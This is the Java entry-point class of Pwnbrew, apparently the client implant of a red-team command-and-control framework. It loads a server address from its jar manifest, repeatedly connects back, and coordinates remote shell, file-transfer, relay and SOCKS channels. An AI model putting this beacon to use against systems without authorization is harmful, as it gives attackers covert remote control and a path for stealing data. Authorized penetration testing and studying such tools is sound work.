/*

Copyright (C) 2013-2014, Securifera, Inc 

All rights reserved. 

Redistribution and use in source and binary forms, with or without modification, 
are permitted provided that the following conditions are met:

    * Redistributions of source code must retain the above copyright notice,
	this list of conditions and the following disclaimer.

    * Redistributions in binary form must reproduce the above copyright notice,
	this list of conditions and the following disclaimer in the documentation 
	and/or other materials provided with the distribution.

    * Neither the name of Securifera, Inc nor the names of its contributors may be 
	used to endorse or promote products derived from this software without specific
	prior written permission.

THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS 
OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY 
AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER 
OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR 
CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR 
SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON 
ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT 
(INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, 
EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

================================================================================

Pwnbrew is provided under the 3-clause BSD license above.

The copyright on this package is held by Securifera, Inc

*/


package pwnbrew;

import java.io.IOException;
import java.io.InputStream;
import java.net.URL;
import java.net.URLConnection;
import java.net.UnknownHostException;
import java.util.ArrayList;
import java.util.List;
import java.util.logging.Level;
import pwnbrew.log.RemoteLog;
import pwnbrew.log.LoggableException;
import pwnbrew.manager.PortManager;
import pwnbrew.manager.DataManager;
import pwnbrew.manager.OutgoingConnectionManager;
import pwnbrew.utilities.Constants;
import pwnbrew.utilities.DebugPrinter;
import pwnbrew.utilities.ReconnectTimer;
import pwnbrew.utilities.Utilities;
import pwnbrew.network.control.ControlMessageManager;
import pwnbrew.network.control.messages.TaskStatus;
import pwnbrew.network.file.FileMessageManager;
import pwnbrew.network.http.ClientHttpWrapper;
import pwnbrew.network.http.Http;
import pwnbrew.network.relay.RelayManager;
import pwnbrew.network.shell.ShellMessageManager;
import pwnbrew.socks.SocksMessageManager;
import pwnbrew.task.TaskListener;
import pwnbrew.utilities.Utilities.ManifestProperties;


/**
 *
 *  
 */
public final class Pwnbrew extends PortManager implements TaskListener {

    private static final String NAME_Class = Pwnbrew.class.getSimpleName();
    private static final boolean debug = false;
  
     
    //===============================================================
    /**
     *  Constructor
    */
    private Pwnbrew( List<String> argList ) throws LoggableException, IOException {
        
        //Make sure the we aren't running already
        DebugPrinter.enable( debug );       
        if( argList.size() > 1 ){

            //Get the control port
            ClientConfig theConf = ClientConfig.getConfig();
            if( theConf == null ){
                throw new RuntimeException("Could not load/create the conf file.");
            }            
            
            theConf.setServerIp(argList.get(0));
            theConf.setSocketPort(argList.get(1));  
            
            //Get the serial
            if( argList.size() > 2)
                theConf.setServerCertSerial(argList.get(2));
            
            if( argList.size() > 3 && argList.get(3) != null)
                theConf.setHostHeader(argList.get(3));
            
        
        } else {
            throw new RuntimeException("Incorrect parameters.");
        }
        
        //Initialize everything
        initialize();

    }

    
    //===============================================================
     /**
     *  Starts the server manager and its associated components.
     *
    */
    private void start() throws UnknownHostException, LoggableException {
        
        //Try and connect to the server
        int thePort = ClientConfig.getConfig().getSocketPort();
        getPortRouter( thePort );
        
        //Create the Timer
        ReconnectTimer aReconnectTimer = new ReconnectTimer(OutgoingConnectionManager.COMM_CHANNEL_ID); 
        
        //Start the timer
        aReconnectTimer.setCommManager( this );
        aReconnectTimer.start();
            
        
    }
     
    //===============================================================
    /**
     * Shuts down the control and data com threads
     *
     */
    @Override
    public void shutdown(){

        //Set flag
        try {
            
            super.shutdown();

            //Shutdown the managers
            ControlMessageManager aCMM = ControlMessageManager.getControlMessageManager();
            if( aCMM != null ){
                aCMM.shutdown();
            }

            FileMessageManager aFMM = FileMessageManager.getFileMessageManager();
            if( aFMM != null ){
                aFMM.shutdown();
            }

            ShellMessageManager aSMM = ShellMessageManager.getShellMessageManager();
            if( aSMM != null ){
                aSMM.shutdown();
            }      
            
            RelayManager theRelayManager = RelayManager.getRelayManager();
            if( theRelayManager != null ){
                theRelayManager.shutdown();
            }
            
            SocksMessageManager aSocksMM = SocksMessageManager.getSocksMessageManager();
            if( aSocksMM != null ){
                aSocksMM.shutdown();
            } 

            //Shutdown debugger
            DebugPrinter.shutdown();

            //Shutdown the executor
            Constants.Executor.shutdownNow();
            
        } catch( IllegalStateException ex ){
        
        }
    }

     /**
     * @param args the command line arguments
     * @throws java.lang.Throwable
     */
    public static void main(String[] args) throws Throwable {
        
        try {
            
            List<String> argList = new ArrayList<>();
            if( args.length == 0 ){
                
                ManifestProperties localProperties = new ManifestProperties();
                Class localClass = Pwnbrew.class;

                URL ourUrl = localClass.getProtectionDomain().getCodeSource().getLocation();
                String aStr = ourUrl.toExternalForm();

                final URL manifest =  new URL("jar:" + aStr + "!/" + Constants.PROP_FILE);
                URLConnection theConnection = manifest.openConnection();
                InputStream localInputStream = theConnection.getInputStream();
                
                if (localInputStream != null) {
                    localProperties.load(localInputStream);
                    localInputStream.close();
                } else {
                    return;
                }

                //Get ip
                String ip = localProperties.getProperty(Constants.SERV_LABEL);
                if( ip == null ){
                    return;
                }

                //Get control
                String thePort = localProperties.getProperty(Constants.PORT_LABEL);
                if( thePort == null ){
                    return;
                }

                argList.add(ip);
                argList.add(thePort);
            
            } else {
                
                String httpsStr = "https://";
                //Get the connect string
                String connectStr = args[0];
                if( connectStr.contains(httpsStr)){
                    String[] connectArr = connectStr.replace(httpsStr, "").replace("/", "").trim().split(":");
                    if( connectArr.length > 1 ){
                        argList.add(connectArr[0]);
                        argList.add(connectArr[1]);
                    }
                }
                
                //Check if a cert serial was sent
                if( args.length > 1 && args[1] != null )
                    argList.add(args[1]);     
                
                //Check if a host was provided
                if( args.length > 2 && args[2] != null )
                    argList.add(args[2]);  
                
            }
        
            //Parse the command line args
            if( argList.size() > 0 ){
               
                //Instantiate the manager and start it up
                Pwnbrew entryPoint = new Pwnbrew( argList );
                entryPoint.start();

                return;
            
            }
            
            System.out.println("Incorrect parameters.");

        } catch (Throwable ex) {
           
            ex.printStackTrace();
          
            //Try to send the remote log first
            RemoteLog.log(Level.WARNING, NAME_Class, "main()", ex.getMessage(), ex);
            DebugPrinter.shutdown();
            Constants.Executor.shutdownNow();
            throw ex;
           
        } 

    }

    //===============================================================
    /**
    * Handles the task changes
    *
    */
    @Override
    public void taskChanged(TaskStatus passedMsg) {

        int taskId = passedMsg.getTaskId();

        String taskStatus = passedMsg.getStatus();
        if (taskStatus.equals( TaskStatus.TASK_CANCELLED)){
            
            //Get the file manager
            try {
                
                FileMessageManager theFileMM = FileMessageManager.getFileMessageManager();
                if( theFileMM == null ){
                    theFileMM = FileMessageManager.initialize( this );
                } 
                theFileMM.cancelFileTransfer( taskId ); 
                
            } catch( IOException | LoggableException ex){
                RemoteLog.log(Level.WARNING, NAME_Class, "taskChanged()", ex.getMessage(), ex);
            }
            
        }

    }

    //===============================================================
    /**
    *   Executes the Runnable.
    *
     * @param command
    */
    public void execute(Runnable command) {
        Constants.Executor.execute(command);
    }
  
    // ========================================================================
    /**
     * Returns the Comm Manager
     * @return 
    */
    public PortManager getCommManager() {
        return this;
    }
    
    // ========================================================================
    /**
     *  Handles any functions that need to be executed before the program starts.
     * @throws pwnbrew.log.LoggableException
     */
    public void initialize() throws LoggableException {

        //Get the port
        int thePort = ClientConfig.getConfig().getSocketPort();        
        
        //Create and set the http wrapper
        if( Utilities.isStaged() ){
            //Has to use http because the stager is currently http
            ClientHttpWrapper aWrapper = new ClientHttpWrapper();
            DataManager.setPortWrapper( thePort, aWrapper); 
            
        } else {
        
            //Switch based on the port
            switch( thePort ){
                case Http.DEFAULT_PORT:
                case Http.SECURE_PORT:
                    ClientHttpWrapper aWrapper = new ClientHttpWrapper();
                    DataManager.setPortWrapper( thePort, aWrapper);
                    break;
            }
        }
        
             
    }    
    
}